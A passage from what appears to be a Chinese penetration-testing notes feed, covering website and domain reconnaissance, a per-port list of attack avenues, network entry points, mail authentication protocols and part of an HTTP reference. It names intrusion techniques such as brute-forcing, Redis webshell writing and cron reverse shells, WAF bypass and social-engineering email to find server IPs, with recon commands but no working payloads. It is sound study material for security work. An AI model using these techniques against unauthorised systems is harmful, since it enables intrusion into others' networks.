            "content_html": "<ul>\n<li>\n<p>判断网站操作系统</p>\n<ul>\n<li>Linux 大小写敏感</li>\n<li>Windows 大小写不敏感</li>\n</ul>\n</li>\n<li>\n<p>扫描敏感文件</p>\n<ul>\n<li>robots.txt</li>\n<li>crossdomain.xml</li>\n<li>sitemap.xml</li>\n<li>xx.tar.gz</li>\n<li>xx.bak 等</li>\n</ul>\n</li>\n<li>\n<p>确定网站采用的语言</p>\n<ul>\n<li>如 PHP / Java / Python 等</li>\n<li>找后缀，比如 php/asp/jsp</li>\n</ul>\n</li>\n<li>\n<p>前端框架</p>\n<ul>\n<li>如 jQuery / BootStrap / Vue / React / Angular 等</li>\n<li>查看源代码</li>\n</ul>\n</li>\n<li>\n<p>中间服务器</p>\n<ul>\n<li>如 Apache / Nginx / IIS 等</li>\n<li>查看 header 中的信息</li>\n<li>根据报错信息判断</li>\n<li>根据默认页面判断</li>\n</ul>\n</li>\n<li>\n<p>Web 容器服务器</p>\n<ul>\n<li>如 Tomcat / Jboss / Weblogic 等</li>\n</ul>\n</li>\n<li>\n<p>后端框架</p>\n<ul>\n<li>根据 Cookie 判断</li>\n<li>根据 CSS / 图片等资源的 hash 值判断</li>\n<li>根据 URL 路由判断\n<ul>\n<li>如 wp-admin</li>\n</ul>\n</li>\n<li>根据网页中的关键字判断</li>\n<li>根据响应头中的 X-Powered-By</li>\n</ul>\n</li>\n<li>\n<p>CDN 信息</p>\n<ul>\n<li>常见的有 Cloudflare、yunjiasu</li>\n</ul>\n</li>\n<li>\n<p>探测有没有 WAF，如果有，什么类型的</p>\n<ul>\n<li>有 WAF，找绕过方式</li>\n<li>没有，进入下一步</li>\n</ul>\n</li>\n<li>\n<p>扫描敏感目录，看是否存在信息泄漏</p>\n<ul>\n<li>扫描之前先自己尝试几个的 url，人为看看反应</li>\n</ul>\n</li>\n<li>\n<p>使用爬虫爬取网站信息</p>\n</li>\n<li>\n<p>拿到一定信息后，通过拿到的目录名称，文件名称及文件扩展名了解网站开发人员的命名思路，确定其命名规则，推测出更多的目录及文件名</p>\n</li>\n<li>\n<p>常见入口目标</p>\n<ul>\n<li>关注度低的系统</li>\n<li>业务线较长的系统</li>\n</ul>\n</li>\n</ul>\n",
            "tags": [
                "网站",
                "信息收集",
                "搜索"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/information%20gathering/Ports/",
            "url": "https://mobius-0.github.io/security/WebNote/information%20gathering/Ports/",
            "title": "端口信息",
            "date_published": "2022-11-25T09:02:36.000Z",
            "content_html": "<h1 id=\"常见端口及其脆弱点\"><a class=\"anchor\" href=\"#常见端口及其脆弱点\">#</a> 常见端口及其脆弱点</h1>\n<ul>\n<li>\n<p>FTP (21/TCP)</p>\n<ul>\n<li>默认用户名密码  <code>anonymous:anonymous</code></li>\n<li>暴力破解密码</li>\n<li>VSFTP 某版本后门</li>\n</ul>\n</li>\n<li>\n<p>SSH (22/TCP)</p>\n<ul>\n<li>部分版本 SSH 存在漏洞可枚举用户名</li>\n<li>暴力破解密码</li>\n</ul>\n</li>\n<li>\n<p>Telent (23/TCP)</p>\n<ul>\n<li>暴力破解密码</li>\n<li>嗅探抓取明文密码</li>\n</ul>\n</li>\n<li>\n<p>SMTP (25/TCP)</p>\n<ul>\n<li>无认证时可伪造发件人</li>\n</ul>\n</li>\n<li>\n<p>DNS (53/UDP &amp; 53/TCP)</p>\n<ul>\n<li>\n<p>域传送漏洞</p>\n</li>\n<li>\n<p>DNS 劫持</p>\n</li>\n<li>\n<p>DNS 缓存投毒</p>\n</li>\n<li>\n<p>DNS 欺骗</p>\n</li>\n<li>\n<p>SPF / DMARC Check</p>\n</li>\n<li>\n<p>DDoS</p>\n<ul>\n<li>\n<p>DNS Query Flood</p>\n</li>\n<li>\n<p>DNS 反弹</p>\n</li>\n</ul>\n</li>\n<li>\n<p>DNS 隧道</p>\n</li>\n</ul>\n</li>\n<li>\n<p>DHCP 67/68</p>\n<ul>\n<li>劫持 / 欺骗</li>\n</ul>\n</li>\n<li>\n<p>TFTP (69/TCP)</p>\n</li>\n<li>\n<p>HTTP (80/TCP)</p>\n</li>\n<li>\n<p>Kerberos (88/TCP)</p>\n<ul>\n<li>主要用于监听 KDC 的票据请求</li>\n<li>用于进行黄金票据和白银票据的伪造</li>\n</ul>\n</li>\n<li>\n<p>POP3 (110/TCP &amp; 995/TCP)</p>\n<ul>\n<li>爆破</li>\n</ul>\n</li>\n<li>\n<p>RPC (135/TCP)</p>\n<ul>\n<li>wmic 服务利用</li>\n</ul>\n</li>\n<li>\n<p>NetBIOS (137/UDP &amp; 138/UDP)</p>\n<ul>\n<li>未授权访问</li>\n<li>弱口令</li>\n</ul>\n</li>\n<li>\n<p>NetBIOS / Samba (139/TCP)</p>\n<ul>\n<li>未授权访问</li>\n<li>弱口令</li>\n</ul>\n</li>\n<li>\n<p>IMAP (143/TCP &amp; 993/TCP)</p>\n</li>\n<li>\n<p>SNMP (161/TCP &amp; 161/UDP)</p>\n<ul>\n<li>Public 弱口令</li>\n</ul>\n</li>\n<li>\n<p>LDAP (389/TCP)</p>\n<ul>\n<li>用于域上的权限验证服务</li>\n<li>匿名访问</li>\n<li>注入</li>\n</ul>\n</li>\n<li>\n<p>HTTPS (443/TCP)</p>\n</li>\n<li>\n<p>SMB (445/TCP)</p>\n<ul>\n<li>Windows 协议簇，主要功能为文件共享服务</li>\n<li><code>net use \\\\192.168.1.1 /user:xxx\\username password</code></li>\n</ul>\n</li>\n<li>\n<p>Linux Rexec (512/TCP &amp; 513/TCP &amp; 514/TCP)</p>\n<ul>\n<li>弱口令</li>\n</ul>\n</li>\n<li>\n<p>Rsync (873/TCP)</p>\n<ul>\n<li>未授权访问</li>\n</ul>\n</li>\n<li>\n<p>RPC (1025/TCP)</p>\n<ul>\n<li>NFS 匿名访问</li>\n</ul>\n</li>\n<li>\n<p>Java RMI (1090/TCP &amp; 1099/TCP)</p>\n<ul>\n<li>反序列化远程命令执行漏洞</li>\n</ul>\n</li>\n<li>\n<p>MSSQL (1433/TCP)</p>\n<ul>\n<li>弱密码</li>\n<li>差异备份 GetShell</li>\n<li>SA 提权</li>\n</ul>\n</li>\n<li>\n<p>Oracle (1521/TCP)</p>\n<ul>\n<li>弱密码</li>\n</ul>\n</li>\n<li>\n<p>NFS (2049/TCP)</p>\n<ul>\n<li>权限设置不当</li>\n<li><code>showmount &lt;host&gt;</code></li>\n</ul>\n</li>\n<li>\n<p>ZooKeeper (2171/TCP &amp; 2375/TCP)</p>\n<ul>\n<li>无身份认证</li>\n</ul>\n</li>\n<li>\n<p>Docker Remote API (2375/TCP)</p>\n<ul>\n<li>未限制 IP / 未启用 TLS 身份认证</li>\n<li><code>http://docker.addr:2375/version</code></li>\n</ul>\n</li>\n<li>\n<p>MySQL (3306/TCP)</p>\n<ul>\n<li>弱密码</li>\n<li>日志写 WebShell</li>\n<li>UDF 提权</li>\n<li>MOF 提权</li>\n</ul>\n</li>\n<li>\n<p>RDP / Terminal Services (3389/TCP)</p>\n<ul>\n<li>弱密码</li>\n</ul>\n</li>\n<li>\n<p>Postgres (5432/TCP)</p>\n<ul>\n<li>弱密码</li>\n<li>执行系统命令</li>\n</ul>\n</li>\n<li>\n<p>VNC (5900/TCP)</p>\n<ul>\n<li>弱密码</li>\n</ul>\n</li>\n<li>\n<p>CouchDB (5984/TCP)</p>\n<ul>\n<li>未授权访问</li>\n</ul>\n</li>\n<li>\n<p>WinRM (5985/TCP)</p>\n<ul>\n<li>Windows 对 WS-Management 的实现</li>\n<li>在 Vista 上需要手动启动，在 Windows Server 2008 中服务是默认开启的</li>\n</ul>\n</li>\n<li>\n<p>Redis (6379/TCP)</p>\n<ul>\n<li>无密码或弱密码</li>\n<li>绝对路径写 WebShell</li>\n<li>计划任务反弹 Shell</li>\n<li>写 SSH 公钥</li>\n<li>主从复制 RCE</li>\n<li>Windows 写启动项</li>\n</ul>\n</li>\n<li>\n<p>Kubernetes API Server (6443/TCP &amp;&amp; 10250/TCP)</p>\n<ul>\n<li><code>https://Kubernetes:10250/pods</code></li>\n</ul>\n</li>\n<li>\n<p>JDWP (8000/TCP)</p>\n<ul>\n<li>远程命令执行</li>\n</ul>\n</li>\n<li>\n<p>ActiveMQ (8061/TCP)</p>\n</li>\n<li>\n<p>Jenkin (8080/TCP)</p>\n<ul>\n<li>未授权访问</li>\n</ul>\n</li>\n<li>\n<p>Elasticsearch (9200/TCP)</p>\n<ul>\n<li>代码执行</li>\n<li><code>http://es.addr:9200/_plugin/head/</code></li>\n<li><code>http://es.addr:9200/_nodes</code></li>\n</ul>\n</li>\n<li>\n<p>Memcached (11211/TCP &amp; 11211/UDP)</p>\n<ul>\n<li>未授权访问</li>\n</ul>\n</li>\n<li>\n<p>RabbitMQ (15672/TCP &amp; 15692/TCP &amp; 25672/TCP)</p>\n</li>\n<li>\n<p>MongoDB (27017/TCP)</p>\n<ul>\n<li>无密码或弱密码</li>\n</ul>\n</li>\n<li>\n<p>Hadoop (50070/TCP &amp; 50075/TCP)</p>\n<ul>\n<li>未授权访问</li>\n</ul>\n</li>\n</ul>\n<p>除了以上列出的可能出现的问题，暴露在公网上的服务若不是最新版，都可能存在已经公开的漏洞</p>\n<h1 id=\"常见端口扫描技术\"><a class=\"anchor\" href=\"#常见端口扫描技术\">#</a> 常见端口扫描技术</h1>\n<h2 id=\"全扫描\"><a class=\"anchor\" href=\"#全扫描\">#</a> 全扫描</h2>\n<p>扫描主机尝试使用三次握手与目标主机的某个端口建立正规的连接，若成功建立连接，则端口处于开放状态，反之处于关闭状态。</p>\n<p>全扫描实现简单，且以较低的权限就可以进行该操作。但是在流量日志中会有大量明显的记录。</p>\n<h2 id=\"半扫描\"><a class=\"anchor\" href=\"#半扫描\">#</a> 半扫描</h2>\n<p>半扫描也称 SYN 扫描，在半扫描中，仅发送 SYN 数据段，如果应答为 RST，则端口处于关闭状态，若应答为 SYN/ACK，则端口处于监听状态。不过这种方式需要较高的权限，而且现在的大部分防火墙已经开始对这种扫描方式做处理。</p>\n<h2 id=\"fin扫描\"><a class=\"anchor\" href=\"#fin扫描\">#</a> FIN 扫描</h2>\n<p>FIN 扫描是向目标发送一个 FIN 数据包，如果是开放的端口，会返回 RST 数据包，关闭的端口则不会返回数据包，可以通过这种方式来判断端口是否打开。</p>\n<p>这种方式并不在 TCP 三次握手的状态中，所以不会被记录，相对 SYN 扫描要更隐蔽一些。</p>\n<h1 id=\"web服务\"><a class=\"anchor\" href=\"#web服务\">#</a> Web 服务</h1>\n<ul>\n<li>\n<p>Jenkins</p>\n<ul>\n<li>未授权访问</li>\n</ul>\n</li>\n<li>\n<p>Gitlab</p>\n<ul>\n<li>对应版本 CVE</li>\n</ul>\n</li>\n<li>\n<p>Zabbix</p>\n<ul>\n<li>权限设置不当</li>\n</ul>\n</li>\n</ul>\n<h1 id=\"批量搜索\"><a class=\"anchor\" href=\"#批量搜索\">#</a> 批量搜索</h1>\n<ul>\n<li>Censys</li>\n<li>Shodan</li>\n<li>ZoomEye</li>\n</ul>\n",
            "tags": [
                "漏洞",
                "信息收集",
                "端口"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/information%20gathering/domain%20information/",
            "url": "https://mobius-0.github.io/security/WebNote/information%20gathering/domain%20information/",
            "title": "域名信息",
            "date_published": "2022-11-25T08:54:06.000Z",
            "content_html": "<h1 id=\"whois\"><a class=\"anchor\" href=\"#whois\">#</a> Whois</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cud2hvaXMuY29tLw==\">Whois</span> 可以查询域名是否被注册，以及注册域名的详细信息的数据库，其中可能会存在一些有用的信息，例如域名所有人、域名注册商、邮箱等。</p>\n<h1 id=\"搜索引擎搜索\"><a class=\"anchor\" href=\"#搜索引擎搜索\">#</a> 搜索引擎搜索</h1>\n<p>搜索引擎通常会记录域名信息，可以通过  <code>site: domain</code>  的语法来查询。</p>\n<h1 id=\"第三方查询\"><a class=\"anchor\" href=\"#第三方查询\">#</a> 第三方查询</h1>\n<p>网络中有相当多的第三方应用提供了子域的查询功能，下面有一些例子，更多的网站可以在 8.1 工具列表 中查找。</p>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v\">DNSDumpster</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20v\">Virustotal</span></li>\n<li>CrtSearch</li>\n<li>threatminer</li>\n<li>Censys</li>\n</ul>\n<h1 id=\"asn信息关联\"><a class=\"anchor\" href=\"#asn信息关联\">#</a> ASN 信息关联</h1>\n<p>在网络中一个自治系统 (Autonomous System, AS) 是一个有权自主地决定在本系统中应采用何种路由协议的小型单位。这个网络单位可以是一个简单的网络也可以是一个由一个或多个普通的网络管理员来控制的网络群体，它是一个单独的可管理的网络单元 (例如一所大学，一个企业或者一个公司个体) 。</p>\n<p>一个自治系统有时也被称为是一个路由选择域 (routing domain) 。一个自治系统将会分配一个全局的唯一的 16 位号码，这个号码被称为自治系统号 (ASN) 。因此可以通过 ASN 号来查找可能相关的 IP，例如：</p>\n<pre><code>whois -h whois.radb.net -- '-i origin AS111111' | grep -Eo &quot;([0-9.]+)&#123;4&#125;/[0-9]+&quot; | uniq\nnmap --script targets-asn --script-args targets-asn.asn=15169\n</code></pre>\n<h1 id=\"域名相关性\"><a class=\"anchor\" href=\"#域名相关性\">#</a> 域名相关性</h1>\n<p>同一个企业 / 个人注册的多个域名通常具有一定的相关性，例如使用了同一个邮箱来注册、使用了同一个备案、同一个负责人来注册等，可以使用这种方式来查找关联的域名。一种操作步骤如下：</p>\n<ul>\n<li>查询域名注册邮箱</li>\n<li>通过域名查询备案号</li>\n<li>通过备案号查询域名</li>\n<li>反查注册邮箱</li>\n<li>反查注册人</li>\n<li>通过注册人查询到的域名在查询邮箱</li>\n<li>通过上一步邮箱去查询域名</li>\n<li>查询以上获取出的域名的子域名</li>\n</ul>\n<h1 id=\"网站信息利用\"><a class=\"anchor\" href=\"#网站信息利用\">#</a> 网站信息利用</h1>\n<p>网站中有相当多的信息，网站本身、各项安全策略、设置等都可能暴露出一些信息。</p>\n<p>网站本身的交互通常不囿于单个域名，会和其他子域交互。对于这种情况，可以通过爬取网站，收集站点中的其他子域信息。这些信息通常出现在 JavaScript 文件、资源文件链接等位置。</p>\n<p>网站的安全策略如跨域策略、CSP 规则等通常也包含相关域名的信息。有时候多个域名为了方便会使用同一个 SSL/TLS 证书，因此有时可通过证书来获取相关域名信息。</p>\n<h1 id=\"https证书\"><a class=\"anchor\" href=\"#https证书\">#</a> HTTPS 证书</h1>\n<h2 id=\"证书透明度\"><a class=\"anchor\" href=\"#证书透明度\">#</a> 证书透明度</h2>\n<p>为了保证 HTTPS 证书不会被误发或伪造，CA 会将证书记录到可公开验证、不可篡改且只能附加内容的日志中，任何感兴趣的相关方都可以查看由授权中心签发的所有证书。因此可以通过查询已授权证书的方式来获得相关域名。</p>\n<h2 id=\"san\"><a class=\"anchor\" href=\"#san\">#</a> SAN</h2>\n<p>主题备用名称 (Subject Alternate Name, SAN)，简单来说，在需要多个域名，并将其用于各项服务时，多使用 SAN 证书。SAN 允许在安全证书中使用 subjectAltName 字段将多种值与证书关联，这些值被称为主题备用名称。</p>\n<h1 id=\"域传送漏洞\"><a class=\"anchor\" href=\"#域传送漏洞\">#</a> 域传送漏洞</h1>\n<p>DNS 域传送 (zone transfer) 指的是冗余备份服务器使用来自主服务器的数据刷新自己的域 (zone) 数据库。这是为了防止主服务器因意外不可用时影响到整个域名的解析。</p>\n<p>一般来说，域传送操作应该只允许可信的备用 DNS 服务器发起，但是如果错误配置了授权，那么任意用户都可以获得整个 DNS 服务器的域名信息。这种错误授权被称作是 DNS 域传送漏洞。</p>\n<h1 id=\"passive-dns\"><a class=\"anchor\" href=\"#passive-dns\">#</a> Passive DNS</h1>\n<p>Passive DNS 被动的从递归域名服务器记录来自不同域名服务器的响应，形成数据库。利用 Passive DNS 数据库可以知道域名曾绑定过哪些 IP，IP 曾关联到哪些域名，域名最早 / 最近出现的时间，为测试提供较大的帮助。Virustotal、passivetotal、CIRCL 等网站都提供了 Passive DNS 数据库的查询。</p>\n<h1 id=\"泛解析\"><a class=\"anchor\" href=\"#泛解析\">#</a> 泛解析</h1>\n<p>泛解析是把 *.example.com 的所有 A 记录都解析到某个 IP 地址上，在子域名枚举时需要处理这种情况以防生成大量无效的记录。</p>\n<h1 id=\"重要记录\"><a class=\"anchor\" href=\"#重要记录\">#</a> 重要记录</h1>\n<h2 id=\"cname\"><a class=\"anchor\" href=\"#cname\">#</a> CNAME</h2>\n<p>CNAME 即 Canonical name，又称 alias，将域名指向另一个域名。其中可能包含其他关联业务的信息。很多网站使用的 CDN 加速功能利用了该记录。</p>\n<h2 id=\"mx记录\"><a class=\"anchor\" href=\"#mx记录\">#</a> MX 记录</h2>\n<p>MX 记录即 Mail Exchanger，记录了发送电子邮件时域名对应的服务器地址。可以用来寻找 SMTP 服务器信息。</p>\n<h2 id=\"ns记录\"><a class=\"anchor\" href=\"#ns记录\">#</a> NS 记录</h2>\n<p>NS (Name Server) 记录是域名服务器的记录，用来指定域名由哪个 DNS 服务器来进行解析。</p>\n<h2 id=\"spf记录\"><a class=\"anchor\" href=\"#spf记录\">#</a> SPF 记录</h2>\n<p>SPF (Sender Policy Framework) 是为了防止垃圾邮件而提出来的一种 DNS 记录类型，是一种 TXT 类型的记录，用于登记某个域名拥有的用来外发邮件的所有 IP 地址。通过 SPF 记录可以获取相关的 IP 信息，常用命令为  <code>dig example.com txt</code>  。</p>\n<h1 id=\"cdn\"><a class=\"anchor\" href=\"#cdn\">#</a> CDN</h1>\n<h2 id=\"cdn验证\"><a class=\"anchor\" href=\"#cdn验证\">#</a> CDN 验证</h2>\n<p>可通过多地 ping 的方式确定目标是否使用了 CDN，常用的网站有  <code>http://ping.chinaz.com/</code>   <code>https://asm.ca.com/en/ping.php</code>  等。</p>\n<h2 id=\"域名查找\"><a class=\"anchor\" href=\"#域名查找\">#</a> 域名查找</h2>\n<p>使用了 CDN 的域名的父域或者子域名不一定使用了 CDN，可以通过这种方式去查找对应的 IP。</p>\n<h2 id=\"历史记录查找\"><a class=\"anchor\" href=\"#历史记录查找\">#</a> 历史记录查找</h2>\n<p>CDN 可能是在网站上线一段时间后才上线的，可以通过查找域名解析记录的方式去查找真实 IP。</p>\n<h2 id=\"邮件信息\"><a class=\"anchor\" href=\"#邮件信息\">#</a> 邮件信息</h2>\n<p>通过社会工程学的方式进行邮件沟通，从邮件头中获取 IP 地址，IP 地址可能是网站的真实 IP 或者是目标的出口 IP。</p>\n<h1 id=\"子域爆破\"><a class=\"anchor\" href=\"#子域爆破\">#</a> 子域爆破</h1>\n<p>在内网等不易用到以上技巧的环境，或者想监测新域名上线时，可以通过批量尝试的方式，找到有效的域名。</p>\n<h1 id=\"缓存探测技术\"><a class=\"anchor\" href=\"#缓存探测技术\">#</a> 缓存探测技术</h1>\n<p>在企业网络中通常都会配置 DNS 服务器为网络内的主机提供域名解析服务。域名缓存侦测（DNS Cache Snooping）技术就是向这些服务器发送域名解析请求，但并不要求使用递归模式，用于探测是否请求过某个域名。这种方式可以用来探测是否使用了某些软件，尤其是安全软件。</p>\n",
            "tags": [
                "域名",
                "信息收集",
                "搜索"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/information%20gathering/network%20io/",
            "url": "https://mobius-0.github.io/security/WebNote/information%20gathering/network%20io/",
            "title": "网络入口/信息",
            "date_published": "2022-11-25T08:44:06.000Z",
            "content_html": "<ul>\n<li>网络拓扑信息\n<ul>\n<li>外网出口</li>\n</ul>\n</li>\n<li>IP 信息\n<ul>\n<li>C 段</li>\n</ul>\n</li>\n<li>线下网络\n<ul>\n<li>Wi-Fi\n<ul>\n<li>SSID</li>\n<li>认证信息</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>VPN\n<ul>\n<li>厂商</li>\n<li>登录方式</li>\n</ul>\n</li>\n<li>邮件网关</li>\n<li>手机 APP</li>\n<li>小程序后台</li>\n<li>OA</li>\n<li>SSO</li>\n<li>边界网络设备</li>\n<li>上游运营商</li>\n</ul>\n",
            "tags": [
                "信息收集"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/mail/",
            "url": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/mail/",
            "title": "邮件协议簇",
            "date_published": "2022-11-25T07:58:31.000Z",
            "content_html": "<h1 id=\"简介\"><a class=\"anchor\" href=\"#简介\">#</a> 简介</h1>\n<h2 id=\"smtp\"><a class=\"anchor\" href=\"#smtp\">#</a> SMTP</h2>\n<p>SMTP (Simple Mail Transfer Protocol) 是一种电子邮件传输的协议，是一组用于从源地址到目的地址传输邮件的规范。不启用 SSL 时端口号为 25，启用 SSL 时端口号多为 465 或 994。</p>\n<h2 id=\"pop3\"><a class=\"anchor\" href=\"#pop3\">#</a> POP3</h2>\n<p>POP3 (Post Office Protocol 3) 用于支持使用客户端远程管理在服务器上的电子邮件。不启用 SSL 时端口号为 110，启用 SSL 时端口号多为 995。</p>\n<h2 id=\"imap\"><a class=\"anchor\" href=\"#imap\">#</a> IMAP</h2>\n<p>IMAP (Internet Mail Access Protocol)，即交互式邮件存取协议，它是跟 POP3 类似邮件访问标准协议之一。不同的是，开启了 IMAP 后，您在电子邮件客户端收取的邮件仍然保留在服务器上，同时在客户端上的操作都会反馈到服务器上，如：删除邮件，标记已读等，服务器上的邮件也会做相应的动作。不启用 SSL 时端口号为 143，启用 SSL 时端口号多为 993。</p>\n<h1 id=\"防护策略\"><a class=\"anchor\" href=\"#防护策略\">#</a> 防护策略</h1>\n<h2 id=\"spf\"><a class=\"anchor\" href=\"#spf\">#</a> SPF</h2>\n<p>发件人策略框架 (Sender Policy Framework, SPF) 是一套电子邮件认证机制，用于确认电子邮件是否由网域授权的邮件服务器寄出，防止有人伪冒身份网络钓鱼或寄出垃圾邮件。SPF 允许管理员设定一个 DNS TXT 记录或 SPF 记录设定发送邮件服务器的 IP 范围，如有任何邮件并非从上述指明授权的 IP 地址寄出，则很可能该邮件并非确实由真正的寄件者寄出。</p>\n<h2 id=\"dkim\"><a class=\"anchor\" href=\"#dkim\">#</a> DKIM</h2>\n<p>域名密钥识别邮件 (DomainKeys Identified Mail, DKIM) 是一种检测电子邮件发件人地址伪造的方法。发送方会在邮件的头中插入 DKIM-Signature，收件方通过查询 DNS 记录中的公钥来验证发件人的信息。</p>\n<h2 id=\"dmarc\"><a class=\"anchor\" href=\"#dmarc\">#</a> DMARC</h2>\n<p>基于网域的消息认证、报告和一致性 (Domain-based Message Authentication, Reporting and Conformance, DMARC) 是电子邮件身份验证协议，用于解决在邮件栏中显示的域名和验证的域名不一致的问题。要通过 DMARC 检查，必须通过 SPF 或 / 和 DKIM 的身份验证，且需要标头地址中的域名必须与经过身份验证的域名一致。</p>\n<h1 id=\"参考链接\"><a class=\"anchor\" href=\"#参考链接\">#</a> 参考链接</h1>\n<h2 id=\"rfc\"><a class=\"anchor\" href=\"#rfc\">#</a> RFC</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzQ0MDg=\">RFC 4408 Sender Policy Framework (SPF) for Authorizing Use of Domains in E-Mail, Version 1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzYzNzY=\">RFC 6376 DomainKeys Identified Mail (DKIM) Signatures</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzcyMDg=\">RFC 7208 Sender Policy Framework (SPF) for Authorizing Use of Domains in Email, Version 1</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzc0ODk=\">RFC 7489 Domain-based Message Authentication, Reporting, and Conformance (DMARC)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzgzMDE=\">RFC 8301 Cryptographic Algorithm and Key Usage Update to DomainKeys Identified Mail (DKIM)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg0NjM=\">RFC 8463 A New Cryptographic Signature Method for DomainKeys Identified Mail (DKIM)</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg2MTY=\">RFC 8616 Email Authentication for Internationalized Mail</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly90b29scy5pZXRmLm9yZy9odG1sL3JmYzg2MTE=\">RFC 8611 Mail</span></li>\n</ul>\n<h2 id=\"相关文档\"><a class=\"anchor\" href=\"#相关文档\">#</a> 相关文档</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvU2VuZGVyX1BvbGljeV9GcmFtZXdvcms=\">Sender Policy Framework wikipedia</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvRG9tYWluS2V5c19JZGVudGlmaWVkX01haWw=\">DomainKeys Identified Mail wikipedia</span></li>\n<li><span class=\"exturl\" data-url=\"aHR0cHM6Ly9lbi53aWtpcGVkaWEub3JnL3dpa2kvRE1BUkM=\">DMARC wikipedia</span></li>\n</ul>\n<h2 id=\"研究文章\"><a class=\"anchor\" href=\"#研究文章\">#</a> 研究文章</h2>\n<ul>\n<li><span class=\"exturl\" data-url=\"aHR0cDovL2kuYmxhY2toYXQuY29tL1VTQS0yMC9UaHVyc2RheS91cy0yMC1DaGVuLVlvdS1IYXZlLU5vLUlkZWEtV2hvLVNlbnQtVGhhdC1FbWFpbC0xOC1BdHRhY2tzLU9uLUVtYWlsLVNlbmRlci1BdXRoZW50aWNhdGlvbi13cC5wZGY=\">Composition Kills:A Case Study of Email Sender Authentication</span></li>\n</ul>\n",
            "tags": [
                "邮件",
                "网络协议"
            ]
        },
        {
            "id": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/HTTP/",
            "url": "https://mobius-0.github.io/security/WebNote/Computer%20Network%20and%20Protocol/HTTP/",
            "title": "HTTP协议簇",
            "date_published": "2022-11-25T03:05:41.000Z",
            "content_html": "<h1 id=\"http标准\"><a class=\"anchor\" href=\"#http标准\">#</a> HTTP 标准</h1>\n<h2 id=\"报文格式\"><a class=\"anchor\" href=\"#报文格式\">#</a> 报文格式</h2>\n<h3 id=\"请求报文格式\"><a class=\"anchor\" href=\"#请求报文格式\">#</a> 请求报文格式</h3>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;method>&lt;request-URL>&lt;version></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>&lt;headers></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;entity-body></pre></td></tr></table></figure><h3 id=\"响应报文格式\"><a class=\"anchor\" href=\"#响应报文格式\">#</a> 响应报文格式</h3>\n<figure class=\"highlight http\"><figcaption data-lang=\"HTTP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>&lt;version>&lt;status>&lt;reason-phrase></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>&lt;headers></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>&lt;entity-body></pre></td></tr></table></figure><h3 id=\"字段解释\"><a class=\"anchor\" href=\"#字段解释\">#</a> 字段解释</h3>\n<ul>\n<li>method\n<ul>\n<li>HTTP 动词</li>\n<li>常见方法：HEAD / GET / POST / PUT / DELETE / PATCH / OPTIONS / TRACE</li>\n<li>扩展方法：LOCK / MKCOL / COPY / MOVE</li>\n</ul>\n</li>\n<li>version\n<ul>\n<li>报文使用的 HTTP 版本</li>\n<li>格式为 HTTP/&lt;major&gt;.&lt;minor&gt;</li>\n</ul>\n</li>\n<li>url\n<ul>\n<li><code>&lt;scheme&gt;://&lt;user&gt;:&lt;password&gt;@&lt;host&gt;:&lt;port&gt;/&lt;path&gt;;&lt;params&gt;?&lt;query&gt;#&lt;frag&gt;</code></li>\n</ul>\n</li>\n</ul>\n<h2 id=\"请求头列表\"><a class=\"anchor\" href=\"#请求头列表\">#</a> 请求头列表</h2>\n<ul>\n<li>Accept\n<ul>\n<li>指定客户端能够接收的内容类型</li>\n<li>Accept: text/plain, text/html</li>\n</ul>\n</li>\n<li>Accept-Charset\n<ul>\n<li>浏览器可以接受的字符编码集</li>\n<li>Accept-Charset: iso-8859-5</li>\n</ul>\n</li>\n<li>Accept-Encoding\n<ul>\n<li>指定浏览器可以支持的 web 服务器返回内容压缩编码类型</li>\n<li>Accept-Encoding: compress, gzip</li>\n</ul>\n</li>\n<li>Accept-Language\n<ul>\n<li>浏览器可接受的语言</li>\n<li>Accept-Language: en,zh</li>\n</ul>\n</li>\n<li>Accept-Ranges\n<ul>\n<li>可以请求网页实体的一个或者多个子范围字段</li>\n<li>Accept-Ranges: bytes</li>\n</ul>\n</li>\n<li>Authorization\n<ul>\n<li>HTTP 授权的授权证书</li>\n<li>Authorization: Basic QWxhZGRpbjpvcGVuIHNlc2FtZQ==</li>\n</ul>\n</li>\n<li>Cache-Control\n<ul>\n<li>指定请求和响应遵循的缓存机制 Cache-Control: 